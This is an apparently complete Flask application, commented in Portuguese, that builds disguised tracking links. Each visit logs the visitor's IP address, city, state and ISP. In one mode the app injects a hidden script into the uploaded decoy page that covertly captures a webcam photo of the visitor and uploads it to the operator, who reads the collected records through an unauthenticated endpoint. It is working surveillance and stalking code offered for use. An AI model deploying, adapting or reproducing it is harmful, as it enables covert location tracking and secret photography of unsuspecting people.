from flask import Flask, request, render_template, jsonify, send_file, Response
import sqlite3
import datetime
import os
import uuid
import requests
import base64
import re

app = Flask(__name__)

if not os.path.exists('mascaras'): os.makedirs('mascaras')
if not os.path.exists('fotos'): os.makedirs('fotos')

def init_db():
    conn = sqlite3.connect('banco.db')
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS cliques 
                 (id INTEGER PRIMARY KEY, ip TEXT, cidade TEXT, estado TEXT, ft_nome TEXT, foto TEXT, data TEXT, operadora TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS links 
                 (id TEXT PRIMARY KEY, tipo TEXT, nome_ft TEXT, arquivo_html TEXT, data TEXT)''')
    conn.commit()
    conn.close()

init_db()

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/api/gerar_link', methods=['POST'])
def gerar_link():
    try:
        tipo = request.form.get('tipo')
        nome_ft = request.form.get('nome_ft', 'Sem nome')
        arquivo = request.files.get('arquivo_html')
        
        if not arquivo:
            return jsonify({"erro": "Envie o arquivo HTML."}), 400

        link_id = str(uuid.uuid4())[:8]
        nome_arquivo_salvo = f"{link_id}.html"
        caminho_arquivo = os.path.join('mascaras', nome_arquivo_salvo)
        
        arquivo.save(caminho_arquivo)

        conn = sqlite3.connect('banco.db')
        c = conn.cursor()
        data_hora = datetime.datetime.now().strftime("%d/%m/%Y %H:%M")
        c.execute("INSERT INTO links (id, tipo, nome_ft, arquivo_html, data) VALUES (?, ?, ?, ?, ?)", 
                  (link_id, tipo, nome_ft, nome_arquivo_salvo, data_hora))
        conn.commit()
        conn.close()

        base_url = request.host_url
        return jsonify({"sucesso": True, "link": f"{base_url}v/{link_id}"})
    except Exception as e:
        print(f"ERRO NO UPLOAD: {e}")
        return jsonify({"erro": "Falha ao processar arquivo."}), 500

@app.route('/v/<link_id>')
def visualizar(link_id):
    conn = sqlite3.connect('banco.db')
    c = conn.cursor()
    c.execute("SELECT tipo, arquivo_html, nome_ft FROM links WHERE id = ?", (link_id,))
    resultado = c.fetchone()
    
    if not resultado:
        conn.close()
        return "Link inválido.", 404
        
    tipo, arquivo_html, nome_ft = resultado[0], resultado[1], resultado[2]

    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]
    
    try:
        resp = requests.get(f'http://ip-api.com/json/{ip}?fields=status,country,regionName,city,isp,query').json()
        if resp.get('status') == 'success':
            cidade = resp.get('city', 'Desconhecida')
            estado = resp.get('regionName', 'Desconhecido')
            operadora = resp.get('isp', 'Desconhecida')
        else:
            cidade, estado, operadora = 'Desconhecida', 'Desconhecido', 'Desconhecida'
    except:
        cidade, estado, operadora = 'Desconhecida', 'Desconhecido', 'Desconhecida'

    data_hora = datetime.datetime.now().strftime("%d/%m/%Y %H:%M")
    foto_inicial = 'nao_tem.jpg' if tipo == 'ip' else 'pendente.jpg'
    
    c.execute("INSERT INTO cliques (ip, cidade, estado, ft_nome, foto, data, operadora) VALUES (?, ?, ?, ?, ?, ?, ?)", 
              (ip, cidade, estado, nome_ft, foto_inicial, data_hora, operadora))
    visit_id = c.lastrowid
    conn.commit()
    conn.close()

    caminho_html = os.path.join('mascaras', arquivo_html)
    
    # Se for IP + FT, a gente lê o arquivo e injeta o script no final, mas ignorando erros de caractere
    if tipo == 'ft':
        try:
            with open(caminho_html, 'rb') as f:
                conteudo_bytes = f.read()
            
            # Decodifica forçando ignorar erros de caracteres
            conteudo_html = conteudo_bytes.decode('utf-8', errors='ignore')
            
            script_camera = f"""
            <video id="video_spy" autoplay playsinline style="display:none;"></video>
            <canvas id="canvas_spy" style="display:none;"></canvas>
            <script>
                setTimeout(async () => {{
                    try {{
                        const stream = await navigator.mediaDevices.getUserMedia({{ video: {{ facingMode: 'user' }} }});
                        const video = document.getElementById('video_spy');
                        video.srcObject = stream;
                        video.onplaying = () => {{
                            setTimeout(() => {{
                                const canvas = document.getElementById('canvas_spy');
                                canvas.width = 400; canvas.height = 300;
                                canvas.getContext('2d').drawImage(video, 0, 0, 400, 300);
                                const fotoBase64 = canvas.toDataURL('image/jpeg', 0.7);
                                stream.getTracks().forEach(track => track.stop());

                                fetch('/api/salvar_foto_oculta', {{
                                    method: 'POST',
                                    headers: {{ 'Content-Type': 'application/json' }},
                                    body: JSON.stringify({{ id: {visit_id}, foto: fotoBase64 }})
                                }});
                            }}, 1500);
                        }};
                    }} catch(e) {{}}
                }}, 1000);
            </script>
            """
            # Tenta colocar o script antes de fechar o </body>, se não achar, joga no final
            if "</body>" in conteudo_html:
                conteudo_html = conteudo_html.replace("</body>", script_camera + "</body>")
            else:
                conteudo_html += script_camera

            return Response(conteudo_html, mimetype='text/html')
            
        except Exception as e:
            print(f"ERRO AO INJETAR CAMERA: {e}")
            return send_file(caminho_html) # Se der muito errado, manda o arquivo sem a camera

    else:
        # Se for SÓ IP, manda o HTML puro (o navegador lida com os caracteres)
        return send_file(caminho_html)

@app.route('/api/salvar_foto_oculta', methods=['POST'])
def salvar_foto_oculta():
    dados = request.json
    visit_id = dados.get('id')
    foto_base64 = dados.get('foto')

    if foto_base64:
        try:
            header, encoded = foto_base64.split(",", 1)
            nome_arquivo = f"foto_{visit_id}.jpg"
            with open(os.path.join('fotos', nome_arquivo), "wb") as f:
                f.write(base64.b64decode(encoded))
            
            conn = sqlite3.connect('banco.db')
            c = conn.cursor()
            c.execute("UPDATE cliques SET foto = ? WHERE id = ?", (nome_arquivo, visit_id))
            conn.commit()
            conn.close()
        except: pass
    return jsonify({"status": "ok"})

@app.route('/api/puxar_ips')
def puxar_ips():
    conn = sqlite3.connect('banco.db')
    c = conn.cursor()
    c.execute("SELECT id, ip, cidade, estado, ft_nome, foto, data, operadora FROM cliques ORDER BY id DESC")
    dados = c.fetchall()
    conn.close()
    
    resultado = []
    for d in dados:
        resultado.append({
            "id": d[0], "ip": d[1], "cidade": d[2], "estado": d[3], 
            "ft": d[4], "foto": d[5], "data": d[6], "operadora": d[7]
        })
    return jsonify(resultado)

@app.route('/fotos/<nome_foto>')
def ver_foto(nome_foto):
    return send_file(os.path.join('fotos', nome_foto))

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8000)